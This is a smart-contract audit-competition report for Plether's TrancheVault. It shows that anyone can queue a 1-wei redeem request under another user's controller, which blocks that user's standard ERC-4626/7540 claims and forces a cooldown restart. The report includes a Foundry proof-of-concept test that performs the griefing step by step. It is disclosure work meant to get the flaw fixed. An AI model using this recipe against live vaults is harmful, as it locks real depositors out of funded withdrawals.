# \#99707 [SC-Low] TrancheVault: anyone can queue a 1-wei redeem request under another controller, which blocks that controller's ERC-4626/7540 claims and forces a cooldown restart to clear

**Submitted on Nov 14th 2026 at 21:31:45 UTC by @nakashu for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99707
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro
TrancheVault.requestRedeem(shares, controller, owner) authenticates only the share owner and accepts any address as controller. A full-balance request skips the minimum redemption size, so an attacker holding 1 wei of shares can place a zero-value redeem request at the head of a victim's controller queue. The standard claim functions (redeem, withdraw, maxRedeem, maxWithdraw) work only on the queue head, so they report zero and revert while the victim has funded USDG waiting in a later epoch. The only call that removes the poisoned head is claimRedeemRefund, which restarts the victim's one-hour cooldown on its whole share balance. The attacker can repeat this every hourly epoch at the cost of gas and 1 wei of shares.

## Vulnerability Details
All references: `packages/perps/src/TrancheVault.sol` at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`.

1. Any controller can be named (L606-632). Only `owner` is checked:

```solidity
if (msg.sender != owner && !isOperator[owner][msg.sender]) {
    _spendAllowance(owner, msg.sender, shares);
}
_transfer(owner, address(this), shares);
requestId = _enqueueRedeemRequest(shares, controller);
```

2. The size floor is skipped for a full-balance request (L1611-1618):

```solidity
if (estimateRedeemAssets(shares) < POOL.minTrancheDepositAssets() && shares < maxShares) {
    revert TrancheVault__WithdrawalTooSmall();
}
```

With a balance of exactly 1 wei, `shares == maxShares` and the request is accepted. One wei of shares is worth zero assets (3-decimal share offset).

3. The request is linked into the victim's queue (`_enqueueRedeemRequest` L688-708, `_appendControllerRedeem` L1783-1797). If the victim has no older open request, it becomes `controllerRedeemHead[victim]`.

4. Standard claims are head-only (L998-1012, L1299-1311):

```solidity
function redeem(uint256 shares, address receiver, address controller) public override returns (uint256 assets) {
    return _claimRedeem(controllerRedeemHead[controller], shares, receiver, controller);
}
function maxRedeem(address controller) public view override returns (uint256) {
    uint256 requestId = controllerRedeemHead[controller];
    return requestId == 0 ? 0 : claimableRedeemRequest(requestId, controller);
}
```

5. At settlement, a head epoch whose quote is zero is turned into a refund epoch (`HousePool._fundRedemptionPhase`, HousePool.sol L957-987, calling `refundRedeemEpochRemainder`, TrancheVault.sol L1505-1524). The victim's position in that epoch has nothing claimable, and it is removed from the queue only by `_maybeCloseRedeemPosition` (L1216-1227) once `refundClaimed` is set.

6. The only function that sets `refundClaimed` is `claimRedeemRefund` (L916-947). It requires `receiver == controller` and does:

```solidity
if (shares != 0) {
    lastDepositTime[receiver] = block.timestamp;
    _transfer(address(this), receiver, shares);
}
```

So the victim must accept the attacker's 1 wei and a fresh `DEPOSIT_COOLDOWN` (1 hour) on its entire balance: transfers revert (`_update`, L325-328) and `requestRedeem` reverts (L617-619).

Earlier reports fixed two neighbouring problems by requiring `receiver == controller` on share-delivering paths (Cecuro LOW-39 and LOW-40). That fix does not cover this route, because here the attacker makes the victim the controller of a request the victim never made.


## Impact Details

- Victim: any LP address or integrator contract, in either tranche (same contract; the PoC uses Junior).
- While the poisoned head exists: `maxRedeem` and `maxWithdraw` return 0 and `redeem` / `withdraw` revert, although `claimableRedeemRequest(victimEpoch, victim)` shows the full funded amount (PoC: half of a 100,000 USDG position, funded and waiting).
- Clearing the head costs a one-hour lock of the whole wallet (no transfer, no new redeem request). The attacker can re-poison each epoch, so a victim that keeps cleaning stays locked.
- No funds are lost, and the non-standard `claimRedeem(requestId, shares, receiver, controller)` still pays out (shown in the PoC). The impact is on the ERC-4626 / ERC-7540 standard surface: an integrator that only uses `maxRedeem` / `redeem` / `maxWithdraw` / `withdraw` cannot collect funded withdrawals until it is changed to call the id-addressed functions.
- Attacker cost: gas plus 1 wei of shares (zero assets) per epoch. Attacker gain: none.


## References

- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L606-L632
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L916-L947
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L998-L1012
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1611-L1618
- Related but different: Cecuro LOW-39, LOW-40, MED-24 in `audits/plether-ai-audit-report-2026-10-26.pdf`.




## Proof of Concept

## Proof of Concept

Runs in the repository's own Foundry suite at the commit in scope. No in-scope contract is modified. Only the repo's standard test doubles are used (mock USDG; the mark is installed through the router address as the repo's own LP tests do).

```bash
git clone --recurse-submodules https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether
git checkout --detach a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
mkdir -p packages/perps/test/poc
forge test --root packages/perps --match-path 'test/poc/ControllerQueueDustPoC.t.sol' -vv
```

What the test does:

1. Alice (victim) and Mallory (attacker) each become ordinary Junior LPs.
2. Mallory moves all but 1 wei of shares to a second wallet and calls `requestRedeem(1, ALICE, MALLORY)`.
3. One epoch later Alice requests redemption of half her shares; settlement funds it in full.
4. Checks: Alice's funded claim exists, yet `maxRedeem(ALICE) == 0`, `maxWithdraw(ALICE) == 0`, and `redeem` / `withdraw` revert. The id-addressed `claimRedeem` works (checked in a snapshot, then reverted).
5. Alice calls `claimRedeemRefund` for the dust request: she receives 1 wei of shares, `lastDepositTime[ALICE] == block.timestamp`, `maxRequestRedeem(ALICE) == 0`, and a share transfer reverts with `TrancheVault__TransferDuringCooldown`. Only then does the standard `redeem` succeed.

Output (run 2026-11-13, Forge 1.5.1-stable, solc 0.8.35, in an offline container on a checkout of the commit with only the PoC file added):

```
Compiling 1 files with Solc 0.8.35
Solc 0.8.35 finished in 45.70s
Ran 1 test for test/poc/ControllerQueueDustPoC.t.sol:ControllerQueueDustPoC
[PASS] test_PoC_DustRedeemForForeignControllerBlocksHeadClaimsAndForcesCooldown() (gas: 2752956)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 10.10ms (3.21ms CPU time)
```

## PoC Source

// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";

/// @notice PoC: any share holder can insert a 1-wei redeem request into another controller's redeem queue.
///         The head-based ERC-4626 / ERC-7540 claim functions of that controller then stop working, and the only
///         way to clear the head restarts the controller's whole-wallet one-hour cooldown.
contract ControllerQueueDustPoC is BasePerpTest {

    address internal constant ALICE = address(0xA11CE); // victim LP
    address internal constant MALLORY = address(0xBAD); // attacker
    address internal constant MALLORY_2 = address(0xBAD2); // attacker's second wallet

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function test_PoC_DustRedeemForForeignControllerBlocksHeadClaimsAndForcesCooldown() public {
        // --- setup: two ordinary junior LPs --------------------------------------------------------------
        uint256 aliceShares = _fundOne(ALICE, 100_000e6);
        uint256 malloryShares = _fundOne(MALLORY, 10_000e6);
        _finishCooldown(ALICE);
        _finishCooldown(MALLORY);

        // --- attack: Mallory keeps exactly 1 wei of shares and redeems it with controller = ALICE ---------
        vm.prank(MALLORY);
        juniorVault.transfer(MALLORY_2, malloryShares - 1);
        assertEq(juniorVault.balanceOf(MALLORY), 1);
        assertEq(juniorVault.estimateRedeemAssets(1), 0, "1 wei of shares is worth zero assets");

        vm.prank(MALLORY);
        uint256 dustRequestId = juniorVault.requestRedeem(1, ALICE, MALLORY);
        assertEq(juniorVault.controllerRedeemHead(ALICE), dustRequestId, "attacker created ALICE's queue head");

        // --- victim: one epoch later Alice requests an ordinary redemption ---------------------------------
        _warpToEpoch(dustRequestId);
        _refreshMark();
        uint256 aliceRedeemShares = aliceShares / 2;
        vm.prank(ALICE);
        uint256 aliceRequestId = juniorVault.requestRedeem(aliceRedeemShares, ALICE, ALICE);
        assertGt(aliceRequestId, dustRequestId);

        _warpToEpoch(aliceRequestId);
        _refreshMark();
        IHousePool.LpEpochSettlementResult memory result = _settleLpEpochForTest();
        assertEq(result.juniorFundedShares, aliceRedeemShares, "Alice's redemption is fully funded");
        uint256 fundedAssets = result.juniorFundedAssets;
        assertGt(fundedAssets, 0);

        // Alice's funded claim exists ...
        assertEq(juniorVault.claimableRedeemRequest(aliceRequestId, ALICE), aliceRedeemShares);
        assertEq(juniorVault.claimableRedeemAssets(aliceRequestId, ALICE), fundedAssets);

        // ... but every head-based ERC-4626 / ERC-7540 claim surface reports zero and reverts.
        assertEq(juniorVault.controllerRedeemHead(ALICE), dustRequestId, "dust request is still the head");
        assertEq(juniorVault.maxRedeem(ALICE), 0, "maxRedeem is zero although funds are claimable");
        assertEq(juniorVault.maxWithdraw(ALICE), 0, "maxWithdraw is zero although funds are claimable");

        vm.startPrank(ALICE);
        vm.expectRevert();
        juniorVault.redeem(aliceRedeemShares, ALICE, ALICE);
        vm.expectRevert();
        juniorVault.withdraw(fundedAssets, ALICE, ALICE);
        vm.expectRevert();
        juniorVault.redeem(1, ALICE, ALICE);
        vm.stopPrank();

        // Honest limit of the impact: the non-standard, id-addressed claim still works.
        uint256 snapshot = vm.snapshotState();
        vm.prank(ALICE);
        assertEq(juniorVault.claimRedeem(aliceRequestId, aliceRedeemShares, ALICE, ALICE), fundedAssets);
        assertEq(juniorVault.controllerRedeemHead(ALICE), dustRequestId, "id-addressed claim does not clear the head");
        vm.revertToState(snapshot);

        // --- the only way to clear the head is claimRedeemRefund, which restarts Alice's wallet cooldown ---
        uint256 cooldownBefore = juniorVault.lastDepositTime(ALICE);
        assertLt(cooldownBefore + juniorVault.DEPOSIT_COOLDOWN(), block.timestamp, "Alice was out of cooldown");
        assertGt(juniorVault.maxRequestRedeem(ALICE), 0, "Alice could request a redemption before cleanup");

        vm.prank(ALICE);
        uint256 refunded = juniorVault.claimRedeemRefund(dustRequestId, ALICE, ALICE);
        assertEq(refunded, 1, "Alice receives the attacker's 1 wei of shares");
        assertEq(juniorVault.lastDepositTime(ALICE), block.timestamp, "whole-wallet cooldown restarted");
        assertEq(juniorVault.maxRequestRedeem(ALICE), 0, "Alice cannot request a redemption for one hour");
        vm.prank(ALICE);
        vm.expectRevert(TrancheVault.TrancheVault__TransferDuringCooldown.selector);
        juniorVault.transfer(address(0xD00D), 1);

        // After the cleanup the standard claim works again.
        assertEq(juniorVault.maxRedeem(ALICE), aliceRedeemShares);
        vm.prank(ALICE);
        assertEq(juniorVault.redeem(aliceRedeemShares, ALICE, ALICE), fundedAssets);

        // The attacker spent 1 wei of shares (worth zero assets) and can repeat this every epoch.
        assertEq(juniorVault.balanceOf(MALLORY_2), malloryShares - 1);
    }

    // ----------------------------------------------------------------------------------------------------
    // helpers (same shape as test/perps/spec/lp/AsyncLpEpochSettlement.t.sol)
    // ----------------------------------------------------------------------------------------------------

    function _fundOne(
        address lp,
        uint256 assets
    ) internal returns (uint256 shares) {
        settlementToken.mint(lp, assets);
        vm.startPrank(lp);
        settlementToken.approve(address(juniorVault), assets);
        uint256 requestId = juniorVault.requestDeposit(assets, lp, lp);
        vm.stopPrank();
        _warpToEpoch(requestId);
        _refreshMark();
        _settleLpEpochForTest();
        uint256 claimable = juniorVault.claimableDepositRequest(requestId, lp);
        vm.prank(lp);
        shares = juniorVault.claimDeposit(requestId, claimable, lp, lp);
        assertGt(shares, 0);
    }

    function _warpToEpoch(
        uint256 epochId
    ) internal {
        uint256 timestamp = pool.lpEpochStart(epochId);
        if (block.timestamp < timestamp) {
            vm.warp(timestamp);
        }
    }

    function _finishCooldown(
        address owner
    ) internal {
        uint256 unlockTime = juniorVault.lastDepositTime(owner) + juniorVault.DEPOSIT_COOLDOWN();
        if (block.timestamp <= unlockTime) {
            vm.warp(unlockTime + 1);
            _refreshMark();
        }
    }

    function _refreshMark() internal {
        uint256 mark = engine.lastMarkPrice();
        vm.prank(address(router));
        engine.updateMarkPrice(mark == 0 ? 1e8 : mark, uint64(block.timestamp));
    }

}


